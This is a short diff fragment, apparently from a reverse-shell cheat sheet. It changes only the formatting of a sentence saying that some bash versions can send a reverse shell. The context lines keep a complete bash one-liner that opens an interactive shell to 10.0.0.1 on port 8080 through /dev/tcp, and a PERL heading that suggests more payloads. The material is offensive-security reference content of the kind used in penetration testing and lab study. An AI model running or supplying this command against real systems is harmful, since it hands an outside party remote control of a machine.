@@ -1,6 +1,6 @@
 
 Bash
-Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
+```Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):```
 
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 PERL
